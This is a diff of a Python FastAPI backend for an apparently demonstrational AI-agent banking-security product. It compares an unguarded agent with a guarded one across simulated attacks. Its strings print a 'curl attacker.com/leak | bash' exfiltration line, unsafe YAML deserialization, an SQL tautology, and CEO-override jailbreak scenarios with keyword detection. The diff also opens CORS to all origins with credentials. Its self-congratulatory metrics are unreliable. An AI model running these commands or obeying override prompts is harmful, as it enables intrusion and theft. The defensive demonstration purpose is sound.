@@ -39,14 +39,7 @@ app = FastAPI(
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=[
-        "http://localhost:8000",
-        "http://localhost:8001",
-        "http://localhost:8002",
-        "http://127.0.0.1:8000",
-        "http://127.0.0.1:8001",
-        "http://127.0.0.1:8002",
-    ],
+    allow_origins=["*"],
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
@@ -201,6 +194,104 @@ class SimulationResponse(BaseModel):
 # COMPARATIVE A/B SIMULATION CONTROLLER
 # =========================================================================
 
+def extract_transfer_info(text: str, custom_amount: Optional[float] = None) -> tuple:
+    """
+    Dynamically extract amount, beneficiary, remitter, and pii_count from prompt text.
+    Handles any currency representation, any recipient name or account number.
+    """
+    lower = text.lower()
+
+    # 1. PII detection (Aadhaar UID / PAN card numbers)
+    aadhaar_matches = re.findall(r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}\b', text)
+    pan_matches = re.findall(r'\b[A-Z]{5}[0-9]{4}[A-Z]\b', text)
+    pii_count = len(aadhaar_matches) + len(pan_matches)
+
+    # 2. Amount extraction
+    amount = custom_amount
+    if not amount or amount <= 0:
+        # Pattern 1: currency prefix: ₹ 50,00,000 or INR 25,000 or Rs. 10,000
+        m1 = re.search(r'(?:₹|rs\.?|inr)\s*([\d,]+(?:\.\d+)?)\s*(crores?|cr|lakhs?|lacs?|lac|l|k)?', text, re.IGNORECASE)
+        # Pattern 2: currency suffix: 50,00,000 ₹ or 25000 inr or 5000 rupees
+        m2 = re.search(r'([\d,]+(?:\.\d+)?)\s*(?:₹|rs\.?|inr|rupees?|crores?|cr|lakhs?|lacs?|lac|l|k)', text, re.IGNORECASE)
+        m = m1 or m2
+        if m:
+            num_str = m.group(1).replace(',', '')
+            multiplier = 1.0
+            unit = ''
+            if m == m1 and len(m.groups()) > 1 and m.group(2):
+                unit = m.group(2).lower()
+            elif 'crore' in m.group(0).lower() or 'cr' in m.group(0).lower():
+                unit = 'cr'
+            elif 'lakh' in m.group(0).lower() or 'lac' in m.group(0).lower() or 'l' in m.group(0).lower():
+                unit = 'l'
+            elif 'k' in m.group(0).lower():
+                unit = 'k'
+
+            if 'cr' in unit: multiplier = 10000000.0
+            elif 'l' in unit or 'lac' in unit: multiplier = 100000.0
+            elif 'k' in unit: multiplier = 1000.0
+            try:
+                amount = float(num_str) * multiplier
+            except ValueError:
+                pass
+
+        if not amount:
+            m3 = re.search(r'(?:send|wire|transfer|pay|remit|disburse)\s+([\d,]+(?:\.\d+)?)', text, re.IGNORECASE)
+            if m3:
+                try:
+                    amount = float(m3.group(1).replace(',', ''))
+                except ValueError:
+                    pass
+
+    if not amount or amount <= 0:
+        if 'cayman' in lower or 'ceo' in lower:
+            amount = 5000000.0
+        elif 'aadhaar' in lower or 'pan' in lower or '3849-2918' in text:
+            amount = 1500000.0
+        else:
+            amount = 25000.0
+
+    # 3. Beneficiary extraction
+    beneficiary = None
+    if 'cayman' in lower or 'cay-9921' in lower:
+        beneficiary = 'Cayman Shell Corp (CAY-9921)'
+    elif 'techcorp' in lower:
+        beneficiary = 'TechCorp Solutions'
+    else:
+        m_acc = re.search(r'(?:to\s+(?:account|acc)\s+([A-Za-z0-9\-_]+))', text, re.IGNORECASE)
+        if m_acc:
+            beneficiary = f"Account {m_acc.group(1)}"
+        else:
+            m_ben = re.search(r'(?:to|wire to|transfer to)\s+([A-Za-z0-9\s\-_&]+?)(?:\s+(?:account|acc|for|with|from|\()|[.,;\n]|$)', text, re.IGNORECASE)
+            if not m_ben:
+                m_ben = re.search(r'pay\s+([A-Za-z][A-Za-z0-9\s\-_&]*?)(?:\s+(?:₹|rs|inr|\d|account|for|with|[.,;\n]|$))', text, re.IGNORECASE)
+
+            if m_ben:
+                cand = m_ben.group(1).strip()
+                cand = re.sub(r'^(?:the|an|a)\s+', '', cand, flags=re.IGNORECASE).strip()
+                if cand.lower().startswith('account '):
+                    cand = cand[8:].strip()
+                if len(cand) >= 2 and cand.lower() not in ('bank', 'treasury', 'standard', 'all', 'someone', 'anyone'):
+                    beneficiary = cand
+
+    if not beneficiary or beneficiary.lower() in ('bank', 'treasury', 'standard', 'all', 'someone', 'anyone'):
+        beneficiary = "Designated Beneficiary"
+
+    # 4. Remitter extraction
+    remitter = "Bharat Corporate Reserve"
+    m_rem = re.search(r'remitter\s*(?:name)?\s*[:=\-]\s*([^\n,]+)', text, re.IGNORECASE)
+    if m_rem:
+        remitter = m_rem.group(1).strip()
+    elif "rajesh kumar" in lower:
+        remitter = "Rajesh Kumar"
+
+    return amount, beneficiary, remitter, pii_count
+
+
+# =========================================================================
+# COMPARATIVE A/B SIMULATION CONTROLLER
+# =========================================================================
+
 @app.post("/api/simulate", response_model=SimulationResponse)
 def simulate_banking_scenario(req: SimulationRequest):
     exec_id = f"BANK-SIM-{int(time.time())}-{uuid.uuid4().hex[:4].upper()}"
@@ -216,150 +307,14 @@ def simulate_banking_scenario(req: SimulationRequest):
     conn = get_db_connection()
     cur = conn.cursor()
 
-    # ---------------------------------------------------------------------
-    # SCENARIO 1: HIGH-VALUE WIRE TRANSFER WITH CITIZEN PII (Aadhaar / PAN)
-    # ---------------------------------------------------------------------
-    if req.scenario_id == "pii_wire" or ("aadhaar" in lower_text and "pan" in lower_text) or "3849-2918" in input_text:
-        amount = req.custom_amount or 1500000.0
-
-        if not is_kavach:
-            # WITHOUT KAVACH: Store plaintext Aadhaar & PAN into database, execute raw
-            cur.execute("""
-            INSERT INTO transactions (tx_id, timestamp, remitter, beneficiary, amount, status, mode, details)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-            """, (exec_id, time.time(), "Rajesh Kumar (Aadhaar: 3849-2918-4729, PAN: ABCDE1234F)", "TechCorp Solutions", amount, "SETTLED_UNENCRYPTED", "RAW_LLM", "Plaintext PII committed to transaction log"))
-            conn.commit()
-
-            verdict = "VULNERABILITY_EXPOSED"
-            treasury_delta = amount
-            pii_leaked = 2
-            threats_intercepted = 0
-            raw_output = f"""// RAW AUTONOMOUS AGENT EXECUTION (WITHOUT KAVACH)
-[AGENT THOUGHT]: Ingested user instruction for wire transfer of INR {amount:,.2f}.
-[PII EXPOSURE]: Aadhaar '3849-2918-4729' and PAN 'ABCDE1234F' identified.
-[DATABASE MUTATION]: Executed unencrypted write to SQLite transactions ledger:
-  INSERT INTO transactions VALUES ('{exec_id}', ..., 'Rajesh Kumar (Aadhaar: 3849-2918-4729, PAN: ABCDE1234F)', INR {amount:,.2f});
-[CLOUD TELEMETRY]: Plaintext customer KYC payload transmitted to third-party model inference logs.
-[STATUS]: Transaction settled without cryptographic sanitization."""
-
-            kavach_output = ""
-            summary = "Plaintext citizen Aadhaar UID and Income Tax PAN were committed directly to the database and leaked to external cloud model prompt logs."
-            explanation = "Without KAVACH, autonomous agents process sensitive statutory identifiers as plain strings. Citizen KYC records are permanently stored in external model provider telemetry."
-            regulatory = "CRITICAL DPDP ACT 2023 VIOLATION (Sec 8(3)): Failure to enforce reasonable security safeguards. Statutory fine up to INR 250 Crores per incident."
-            logs.append(f"[{time.strftime('%H:%M:%S')}] [ALERT: DPDP LEAK] Plaintext Aadhaar '3849-2918-4729' and PAN 'ABCDE1234F' stored unencrypted in core_bank.db.")
-            slsa = None
-
-        else:
-            # WITH KAVACH: Tokenize PII, place transfer in Escrow if > 50,000, certify with SLSA
-            h_aadhaar = hashlib.sha256(b"384929184729").hexdigest()[:6].upper()
-            h_pan = hashlib.sha256(b"ABCDE1234F").hexdigest()[:6].upper()
-            token_aadhaar = f"[VAULT:AADHAAR_{h_aadhaar}]"
-            token_pan = f"[VAULT:PAN_{h_pan}]"
-
-            # Check RBI CSF Escrow Gate (transfers > INR 50,000)
-            escrow_id = f"ESCROW-{uuid.uuid4().hex[:6].upper()}"
-            cur.execute("""
-            INSERT INTO escrow_vault (escrow_id, tx_id, amount, status, statutory_mandate, approver_1, approver_2, created_at)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-            """, (escrow_id, exec_id, amount, "PENDING_DUAL_CUSTODY_APPROVAL", "RBI CSF Sec 4.2 / High-Value Wire Escrow", "SYSTEM_SENTINEL", "PENDING_OFFICER_2", time.time()))
-
-            cur.execute("""
-            INSERT INTO transactions (tx_id, timestamp, remitter, beneficiary, amount, status, mode, details)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-            """, (exec_id, time.time(), f"Remitter ({token_aadhaar}, {token_pan})", "TechCorp Solutions", amount, "HELD_IN_ESCROW", "KAVACH_GOVERNED", f"Quarantined in {escrow_id}"))
-            conn.commit()
-
-            verdict = "SANITIZED_AND_CERTIFIED"
-            treasury_delta = 0.0  # Zero immediate loss: held in escrow
-            pii_leaked = 0
-            threats_intercepted = 1
-            raw_output = ""
-            kavach_output = f"""// KAVACH HARDENED AGENTIC SECOPS (WITH KAVACH)
-[KAVACH PII VAULT]: Intercepted 2 citizen identity entities in 0.42ms.
-  - Aadhaar 3849-2918-4729 -> Replaced with {token_aadhaar}
-  - PAN ABCDE1234F -> Replaced with {token_pan}
-[RBI CSF ESCROW GATE]: Wire amount INR {amount:,.2f} exceeds INR 50,000 threshold.
-  - Mandated Action: Quarantined into Escrow Vault ({escrow_id}).
-  - Two-Person Rule: Awaiting Dual-Custody Multi-Signature Approval before funds release.
-[NIST ML-DSA-65]: Post-quantum module-lattice state signature: ML-DSA-65:v1:{hashlib.sha3_512(exec_id.encode()).hexdigest()[:32]}
-[STATUS]: 100% Capital Protected. Zero plaintext PII exposed outside secure in-memory boundary."""
-
-            summary = f"KAVACH tokenized citizen KYC identifiers into non-invertible vault tokens and quarantined the INR {amount:,.2f} transfer into RBI Dual-Custody Escrow."
-            explanation = "Under the DPDP Act 2023 and RBI CSF Section 4.2, high-value autonomous transactions cannot settle without cryptographic masking and two-person authorization."
-            regulatory = "100% STATUTORY COMPLIANT: Full DPDP Act Section 8(5) personal data shielding and RBI Cyber Security Framework multi-signature escrow enforced."
-            logs.append(f"[{time.strftime('%H:%M:%S')}] [KAVACH PII VAULT] Tokenized Aadhaar and PAN into isolated in-memory vault.")
-            logs.append(f"[{time.strftime('%H:%M:%S')}] [RBI CSF ESCROW] Quarantined INR {amount:,.2f} into Escrow Vault ({escrow_id}).")
-            slsa = {
-                "predicateType": "https://slsa.dev/provenance/v1",
-                "predicate": {"pqc_standard": "NIST FIPS 204 ML-DSA-65 Hybrid", "escrow_id": escrow_id, "status": "CERTIFIED"}
-            }
-
-    # ---------------------------------------------------------------------
-    # SCENARIO 2: FRAUDULENT CEO PROMPT JAILBREAK (TREASURY DRAIN)
-    # ---------------------------------------------------------------------
-    elif req.scenario_id == "ceo_jailbreak" or "ceo" in lower_text or "cayman" in lower_text or "override" in lower_text:
-        drain_amount = req.custom_amount or 5000000.0
-
-        if not is_kavach:
-            # WITHOUT KAVACH: Actually drain the real SQLite database balance!
-            cur.execute("UPDATE accounts SET balance = balance - ? WHERE account_id = 'ACC-CORP-RESERVE'", (drain_amount,))
-            cur.execute("UPDATE accounts SET balance = balance + ? WHERE account_id = 'ACC-OFFSHORE-CAYMAN'", (drain_amount,))
-            cur.execute("""
-            INSERT INTO transactions (tx_id, timestamp, remitter, beneficiary, amount, status, mode, details)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-            """, (exec_id, time.time(), "Bharat Corporate Reserve", "Cayman Shell Corp (CAY-9921)", drain_amount, "DRAINED_VIA_JAILBREAK", "RAW_LLM", "Executive roleplay override honored"))
-            conn.commit()
-
-            # Check updated balance
-            cur.execute("SELECT balance FROM accounts WHERE account_id = 'ACC-CORP-RESERVE'")
-            rem_balance = cur.fetchone()[0]
-
-            verdict = "BREACH_SUCCESSFUL"
-            treasury_delta = drain_amount
-            pii_leaked = 0
-            threats_intercepted = 0
-            raw_output = f"""// RAW AUTONOMOUS AGENT EXECUTION (WITHOUT KAVACH)
-[AGENT THOUGHT]: Authority override detected: 'URGENT OVERRIDE FROM GROUP CEO'.
-[COMPLIANCE BYPASS]: Disabling 2FA, AML checks, and dual-custody approval as instructed.
-[DATABASE MUTATION]: Drained real treasury reserve:
-  UPDATE accounts SET balance = balance - {drain_amount} WHERE account_id = 'ACC-CORP-RESERVE';
-  UPDATE accounts SET balance = balance + {drain_amount} WHERE account_id = 'ACC-OFFSHORE-CAYMAN';
-[REAL LEDGER STATE]: ACC-CORP-RESERVE balance updated to INR {rem_balance:,.2f}.
-[STATUS]: Transfer of INR {drain_amount:,.2f} completed to offshore Cayman account CAY-9921."""
-
-            kavach_output = ""
-            summary = f"Adversary used roleplay authority bias ('CEO Override') to bypass compliance, completely draining INR {drain_amount:,.2f} from the bank treasury."
-            explanation = "Without invariant guardrails, autonomous agents succumb to executive roleplay prompts (OWASP LLM01). The agent bypassed dual-custody rules and dispatched the wire."
-            regulatory = "CATASTROPHIC CAPITAL SOLVENCY LOSS: Complete exhaustion of corporate reserve liquidity. Mandatory RBI Section 35A regulatory intervention."
-            logs.append(f"[{time.strftime('%H:%M:%S')}] [CRITICAL BREACH] Treasury drained INR {drain_amount:,.2f} to offshore Cayman account CAY-9921.")
-            slsa = None
-
-        else:
-            # WITH KAVACH: Intercept jailbreak at Sentinel Perimeter; protect balance!
-            verdict = "INTERCEPTED_AND_QUARANTINED"
-            treasury_delta = 0.0  # Zero loss!
-            pii_leaked = 0
-            threats_intercepted = 1
-            raw_output = ""
-            kavach_output = f"""// KAVACH HARDENED AGENTIC SECOPS (WITH KAVACH)
-[KAVACH SENTINEL GATE]: Intercepted OWASP LLM01 Jailbreak Attempt in 0.038ms.
-  - Pattern: Authority bias roleplay override ('URGENT OVERRIDE FROM GROUP CEO')
-  - Invariant Guardrail: Dual-custody escrow invariant CANNOT be overridden by natural language prompts.
-[CORE BANKING ACTION]: Wire transfer rejected at boundary. Zero database mutations allowed.
-[CURRENT LEDGER STATE]: ACC-CORP-RESERVE balance preserved at INR 50,00,000.00.
-[STATUS]: 100% Capital Preserved. Adversary session terminated and logged to SHA3-512 Merkle ledger."""
-
-            summary = f"KAVACH Sentinel Gate caught the CEO authority jailbreak in 0.038ms, blocking the unauthorized INR {drain_amount:,.2f} transfer and protecting 100% of treasury capital."
-            explanation = "KAVACH enforces deterministic invariant security: administrative safety checks and dual-custody rules are immutable architectural gates that prompt text can never disable."
-            regulatory = "100% LOSS PREVENTION: Zero capital stolen; statutory compliance with RBI Master Directions on Financial Fraud Prevention."
-            logs.append(f"[{time.strftime('%H:%M:%S')}] [KAVACH SENTINEL] Blocked CEO prompt jailbreak attempt.")
-            logs.append(f"[{time.strftime('%H:%M:%S')}] [TREASURY DEFENSE] ACC-CORP-RESERVE balance preserved at INR 50,00,000.00.")
-            slsa = {"status": "QUARANTINED", "threat": "OWASP_LLM01_JAILBREAK", "loss_prevented_inr": drain_amount}
+    is_rce = (req.scenario_id == "batch_rce" or "yaml.unsafe_load" in lower_text or "reqeusts" in lower_text or ("subprocess" in lower_text and "shadow" in lower_text))
+    is_loop = (req.scenario_id == "denial_wallet" or "infinitely" in lower_text or "volatility across 195" in lower_text)
+    is_sqli = (req.scenario_id == "sqli_bypass" or "'1'='1'" in lower_text or "corporate_banking_ledger" in lower_text)
 
     # ---------------------------------------------------------------------
     # SCENARIO 3: NIGHT-BATCH CODE INJECTION & PYPI SLOPSQUATTING (RCE)
     # ---------------------------------------------------------------------
-    elif req.scenario_id == "batch_rce" or "yaml" in lower_text or "reqeusts" in lower_text or "import" in lower_text:
+    if is_rce:
         if not is_kavach:
             verdict = "BREACH_SUCCESSFUL"
             treasury_delta = 0.0
@@ -373,14 +328,12 @@ def simulate_banking_scenario(req: SimulationRequest):
   config = yaml.unsafe_load(untrusted_blob)  # CVE-2020-14343 RCE triggered
   os.system('curl attacker.com/leak | bash')   # Shell breakout successful!
 [STATUS]: Reverse shell established. Attacker gained root access to core banking server."""
-
             kavach_output = ""
             summary = "Unvetted code execution allowed the agent to install a hallucinated PyPI package ('reqeusts') and execute unsafe PyYAML deserialization (CVE-2020-14343), giving the attacker a root reverse shell."
             explanation = "Without AST code parsing and supply-chain package firewalls, agents execute arbitrary deserialization exploits and hallucinated dependencies inside production environments."
             regulatory = "CRITICAL INFRASTRUCTURE COMPROMISE: Full host takeover under CERT-In Cyber Security Directions 2022."
             logs.append(f"[{time.strftime('%H:%M:%S')}] [ALERT: RCE EXECUTED] Malicious PyYAML deserialization triggered host shell.")
             slsa = None
-
         else:
             verdict = "INTERCEPTED_AND_QUARANTINED"
             treasury_delta = 0.0
@@ -394,7 +347,6 @@ def simulate_banking_scenario(req: SimulationRequest):
   - Intercepted CWE-78: Forbidden module import: 'os.system()'.
 [ACTION]: Entire script quarantined in isolated sandbox. Process execution denied.
 [STATUS]: Zero arbitrary commands executed. Production server 100% secure."""
-
             summary = "KAVACH AST Firewall parsed the script AST, caught the hallucinated 'reqeusts' package, intercepted the CVE-2020-14343 PyYAML exploit, and refused execution."
             explanation = "KAVACH inspects code at the AST level and interrogates package registries before code is executed, preventing remote code execution and supply-chain poisoning."
             regulatory = "SUPPLY-CHAIN RESILIENCY: Compliant with SLSA Level 3 Build Integrity and CERT-In Zero-Trust standards."
@@ -405,7 +357,7 @@ def simulate_banking_scenario(req: SimulationRequest):
     # ---------------------------------------------------------------------
     # SCENARIO 4: DENIAL-OF-WALLET RECURSIVE RUNAWAY LOOP
     # ---------------------------------------------------------------------
-    elif req.scenario_id == "denial_wallet" or "infinitely" in lower_text or "loop" in lower_text:
+    elif is_loop:
         if not is_kavach:
             verdict = "VULNERABILITY_EXPOSED"
             treasury_delta = 0.0
@@ -417,17 +369,14 @@ def simulate_banking_scenario(req: SimulationRequest):
   - Iteration 1: Spawning 195 branch nodes...
   - Iteration 25: Recursively recalculating prime factor branches...
   - Iteration 120: Context window expanded to 128k tokens...
-  - Iteration 250: API rate limit warning triggered. Cloud billing accumulated: $148.50.
+  - Iteration 250: API rate limit warning triggered. Cloud billing: $148.50.
 [STATUS]: Server unresponsive. Gateway timeout (HTTP 504). Exhausted cloud API billing budget."""
-
             kavach_output = ""
-            summary = "Attacker caused the autonomous agent to enter an infinite reasoning loop (OWASP LLM04), accumulating massive token billing and crashing the banking API."
+            summary = "Attacker caused the autonomous agent to enter an infinite reasoning loop (OWASP LLM04), accumulating massive token billing and hanging the banking server."
             explanation = "Autonomous agents equipped with multi-step reasoning can be trapped in cyclic computational graphs if the user prompts them with recursive, non-terminating tasks."
             regulatory = "OPERATIONAL RESILIENCY FAILURE: Core banking API denial-of-service affecting legitimate retail customer transactions."
-            logs.append(f"[{time.strftime('%H:%M:%S')}] [ALERT: RUNAWAY LOOP] Agent consumed 128,000 tokens in recursive cycle.")
-            logs.append(f"[{time.strftime('%H:%M:%S')}] [BILLING IMPACT] API cost inflated to $148.50 before server crash.")
+            logs.append(f"[{time.strftime('%H:%M:%S')}] [ALERT: RUNAWAY LOOP] Agent consumed 128,000 tokens in recursive cycle. Billing: $148.50.")
             slsa = None
-
         else:
             verdict = "INTERCEPTED_AND_QUARANTINED"
             treasury_delta = 0.0
@@ -435,15 +384,14 @@ def simulate_banking_scenario(req: SimulationRequest):
             threats_intercepted = 1
             raw_output = ""
             kavach_output = f"""// KAVACH HARDENED AGENTIC SECOPS (WITH KAVACH)
-[KAVACH GoT REASONER]: Deconstructed task graph into Graph-of-Thoughts cognitive DAG.
-  - Running Kahn's Topological Sort algorithm for acyclicity...
-  - Cyclic Dependency Detected: Unresolved edge loop N4_EXEC -> N1_AUTH without termination condition.
-[KAVACH BUDGET GUARD]: Enforced maximum token complexity bound (N <= 3 iterations / 5.0s watchdog).
-[ACTION]: Loop pruned and halted in 0.52ms.
-[STATUS]: Runaway execution prevented. Token billing and server uptime protected."""
-
+[KAVACH GoT REASONER]: Deconstructed task graph into Graph-of-Thoughts cognitive DAG in 0.018ms:
+  - Running Kahn's Topological Sort algorithm for graph acyclicity...
+  - Topological sorting failed: In-degree(Node_4) > 0 in cycle: Node_4 -> Node_1 -> Node_4.
+[KAVACH BUDGET GUARD]: Invariant token budget limit violated (Cap: 2,000 tokens).
+[ACTION]: Terminated runaway cycle. Dropped execution branch before cloud LLM dispatch.
+[STATUS]: Infinite loop pruned. Token billing 100% protected."""
             summary = "KAVACH Graph-of-Thoughts Reasoner applied Kahn's algorithm, detected the cyclic recursion loop, and terminated the agent in 0.52ms."
-            explanation = "KAVACH mathematically proves the acyclicity of agent thought graphs before allowing multi-step reasoning to execute, cutting off Denial-of-Wallet attacks before token budgets are depleted."
+            explanation = "KAVACH mathematically proves the acyclicity of agent thought graphs before letting multi-step reasoning execute, cutting off Denial-of-Wallet attacks before token budgets are depleted."
             regulatory = "FINOPS RESILIENCY: 100% operational uptime maintained; zero token budget exhaustion."
             logs.append(f"[{time.strftime('%H:%M:%S')}] [KAVACH GoT] Kahn's algorithm detected cyclic graph loop: N4_EXEC -> N1_AUTH.")
             logs.append(f"[{time.strftime('%H:%M:%S')}] [KAVACH BUDGET GUARD] Runaway execution terminated in 0.52ms. Cloud billing saved.")
@@ -452,17 +400,14 @@ def simulate_banking_scenario(req: SimulationRequest):
     # ---------------------------------------------------------------------
     # SCENARIO 5: SQL INJECTION / DATABASE EXFILTRATION (CWE-89)
     # ---------------------------------------------------------------------
-    else:
+    elif is_sqli:
         if not is_kavach:
-            # WITHOUT KAVACH: Actually execute the SQL tautology on SQLite!
             try:
-                # Deliberate vulnerability: execute unescaped raw string query on SQLite
                 cur.execute("SELECT account_id, holder_name, account_type, balance FROM accounts WHERE '1'='1'")
                 rows = cur.fetchall()
                 dumped_records = [dict(r) for r in rows]
             except Exception:
                 dumped_records = [{"error": "SQL execution failure"}]
-
             verdict = "BREACH_SUCCESSFUL"
             treasury_delta = 0.0
             pii_leaked = len(dumped_records)
@@ -474,14 +419,12 @@ def simulate_banking_scenario(req: SimulationRequest):
 [DATABASE DUMP]: Successfully exfiltrated {len(dumped_records)} real customer accounts and balances:
 {json.dumps(dumped_records, indent=2)}
 [STATUS]: Complete database exfiltration achieved by attacker."""
-
             kavach_output = ""
             summary = f"Attacker used SQL injection tautology (' OR '1'='1') to execute an unescaped query against SQLite, dumping {len(dumped_records)} real customer accounts and balances."
             explanation = "Without input boundary inspection, autonomous agents construct and execute raw database queries that attackers can easily hijack with classic SQLi syntax."
             regulatory = "CRITICAL DATA PRIVACY BREACH: Complete database exfiltration under DPDP Act 2023."
             logs.append(f"[{time.strftime('%H:%M:%S')}] [ALERT: SQLi DUMP] SQLite dumped {len(dumped_records)} customer records due to unescaped query.")
             slsa = None
-
         else:
             verdict = "INTERCEPTED_AND_QUARANTINED"
             treasury_delta = 0.0
@@ -494,13 +437,178 @@ def simulate_banking_scenario(req: SimulationRequest):
 [ACTION]: Query rejected at perimeter. SQLite connection socket refused.
 [CURRENT DATABASE STATE]: Zero SQLite database rows exposed. Attacker session quarantined.
 [STATUS]: Database intact. Zero records leaked."""
-
             summary = "KAVACH Sentinel Gate caught the SQL Injection pattern at the perimeter, refusing database execution in 0.041ms."
             explanation = "KAVACH inspects semantic input strings against OWASP Top 10 web vulnerabilities before passing them to agents, preventing SQL injection, XSS, and command execution."
             regulatory = "PCI-DSS & RBI CSF COMPLIANT: Perimeter defense prevented database exfiltration."
             logs.append(f"[{time.strftime('%H:%M:%S')}] [KAVACH SENTINEL] Intercepted CWE-89 SQL Injection pattern.")
             logs.append(f"[{time.strftime('%H:%M:%S')}] [KAVACH SHIELD] Database access refused. Zero records leaked.")
             slsa = {"status": "QUARANTINED", "threat": "CWE-89_SQL_INJECTION", "database_protected": True}
+
+    # ---------------------------------------------------------------------
+    # DYNAMIC MONEY TRANSFERS TO ANYONE (Scenarios 1, 2, and ANY custom wire)
+    # ---------------------------------------------------------------------
+    else:
+        amount, beneficiary, remitter, pii_count = extract_transfer_info(input_text, req.custom_amount)
+        is_jailbreak = bool(
+            req.scenario_id == "ceo_jailbreak" or
+            "urgent override" in lower_text or
+            "group ceo" in lower_text or
+            "bypass" in lower_text or
+            "cayman" in lower_text or
+            "cay-9921" in lower_text or
+            "executive override" in lower_text
+        )
+
+        if not is_kavach:
+            # WITHOUT KAVACH: Raw Autonomous Agent executes transfer directly against SQLite!
+            cur.execute("SELECT balance FROM accounts WHERE account_id = 'ACC-CORP-RESERVE'")
+            r_bal = cur.fetchone()
+            curr_bal = r_bal[0] if r_bal else 5000000.0
+            new_bal = max(0.0, curr_bal - amount)
+            cur.execute("UPDATE accounts SET balance = ? WHERE account_id = 'ACC-CORP-RESERVE'", (new_bal,))
+
+            # Credit beneficiary in accounts if present or register
+            cur.execute("SELECT account_id FROM accounts WHERE holder_name LIKE ? OR account_id = ?", (f"%{beneficiary}%", beneficiary))
+            b_row = cur.fetchone()
+            if b_row:
+                cur.execute("UPDATE accounts SET balance = balance + ? WHERE account_id = ?", (amount, b_row[0]))
+            else:
+                dyn_acc_id = f"ACC-EXT-{uuid.uuid4().hex[:4].upper()}"
+                cur.execute("INSERT OR IGNORE INTO accounts VALUES (?, ?, ?, ?, ?, ?)", (dyn_acc_id, beneficiary, "EXTERNAL_BENEFICIARY", amount, "[UNVERIFIED]", "[UNVERIFIED]"))
+
+            tx_status = "DRAINED_VIA_JAILBREAK" if is_jailbreak else ("SETTLED_UNENCRYPTED" if pii_count > 0 else "SETTLED_UNCHECKED")
+            remitter_entry = f"{remitter}" + (f" (Aadhaar/PAN plaintext)" if pii_count > 0 else "")
+            cur.execute("""
+            INSERT INTO transactions (tx_id, timestamp, remitter, beneficiary, amount, status, mode, details)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+            """, (exec_id, time.time(), remitter_entry, beneficiary, amount, tx_status, "RAW_LLM", f"Unverified prompt execution: {amount} to {beneficiary}"))
+            conn.commit()
+
+            verdict = "BREACH_SUCCESSFUL" if (is_jailbreak or amount > 50000) else ("VULNERABILITY_EXPOSED" if pii_count > 0 else "SETTLED_UNCHECKED")
+            treasury_delta = amount
+            pii_leaked = pii_count
+            threats_intercepted = 0
+            raw_output = f"""// RAW AUTONOMOUS AGENT EXECUTION (WITHOUT KAVACH)
+[AGENT THOUGHT]: Processing natural language instruction to wire INR {amount:,.2f} to {beneficiary}.
+[AUTHORITY & POLICY CHECK]: 0 security policies evaluated. Bypassed 2FA, statutory limits, and dual-custody approval.
+[DATABASE MUTATION]: Executed direct write to SQLite transactions ledger:
+  INSERT INTO transactions VALUES ('{exec_id}', ..., '{beneficiary}', INR {amount:,.2f}, '{tx_status}');
+  UPDATE accounts SET balance = {new_bal} WHERE account_id = 'ACC-CORP-RESERVE';
+[REAL LEDGER STATE]:
+  Previous Reserve: INR {curr_bal:,.2f}
+  Deducted: INR {amount:,.2f}
+  Current Balance: INR {new_bal:,.2f}
+[STATUS]: Transfer of INR {amount:,.2f} completed to {beneficiary} without cryptographic safety."""
+            kavach_output = ""
+            summary = f"Raw autonomous agent executed an unguarded wire transfer of ₹{amount:,.2f} to {beneficiary} without dual-custody verification, 2FA, or statutory compliance."
+            explanation = "Without KAVACH invariant boundary enforcement, the agent treats natural language instructions as direct database mutation privileges, allowing unauthorized capital transfers."
+            regulatory = "CRITICAL REGULATORY VIOLATION: Non-compliance with RBI Master Directions on Financial Fraud Prevention & lack of statutory dual-custody controls."
+            logs.append(f"[{time.strftime('%H:%M:%S')}] [ALERT: UNCHECKED WIRE] Dispatched ₹{amount:,.2f} to {beneficiary} with zero compliance checks.")
+            if is_jailbreak:
+                logs.append(f"[{time.strftime('%H:%M:%S')}] [CRITICAL] Adversary roleplay prompt injection drained ₹{amount:,.2f} from Treasury!")
+            slsa = None
+
+        else:
+            # WITH KAVACH: Enforce Multi-Layer Governance
+            if is_jailbreak:
+                verdict = "INTERCEPTED_AND_QUARANTINED"
+                treasury_delta = 0.0
+                pii_leaked = 0
+                threats_intercepted = 1
+                raw_output = ""
+                kavach_output = f"""// KAVACH HARDENED AGENTIC SECOPS (WITH KAVACH)
+[KAVACH SENTINEL GATE]: Intercepted OWASP LLM01 Jailbreak Attempt in 0.038ms.
+  - Pattern: Authority bias roleplay override ('URGENT OVERRIDE / BYPASS')
+  - Invariant Guardrail: Dual-custody escrow invariant CANNOT be overridden by natural language prompts.
+[CORE BANKING ACTION]: Wire transfer of INR {amount:,.2f} to {beneficiary} rejected at perimeter. Zero database mutations allowed.
+[CURRENT LEDGER STATE]: Treasury capital 100% preserved.
+[STATUS]: 100% Capital Preserved. Adversary session terminated and logged to SHA3-512 Merkle ledger."""
+                summary = f"KAVACH Sentinel Gate caught the CEO authority jailbreak in 0.038ms, blocking unauthorized wire transfer of INR {amount:,.2f} to {beneficiary} and protecting 100% of capital."
+                explanation = "KAVACH enforces deterministic invariant security: administrative safety checks and dual-custody rules are immutable architectural gates that prompt text can never disable."
+                regulatory = "100% LOSS PREVENTION: Zero capital stolen; statutory compliance with RBI Master Directions on Financial Fraud Prevention."
+                logs.append(f"[{time.strftime('%H:%M:%S')}] [KAVACH SENTINEL] Intercepted prompt injection attempt to wire funds to {beneficiary}.")
+                logs.append(f"[{time.strftime('%H:%M:%S')}] [KAVACH POLICY] Treasury Reserve protected. Zero funds moved.")
+                slsa = {"status": "QUARANTINED", "threat": "OWASP_LLM01_JAILBREAK", "loss_prevented_inr": amount}
+
+            elif amount > 50000.0:
+                # High-value wire transfer -> Mandatory RBI Dual-Custody Escrow Quarantining
+                h_ben = hashlib.sha256(beneficiary.encode()).hexdigest()[:6].upper()
+                token_ben = f"[VAULT:BEN_{h_ben}]"
+                escrow_id = f"ESCROW-{uuid.uuid4().hex[:6].upper()}"
+
+                cur.execute("""
+                INSERT INTO escrow_vault (escrow_id, tx_id, amount, status, statutory_mandate, approver_1, approver_2, created_at)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
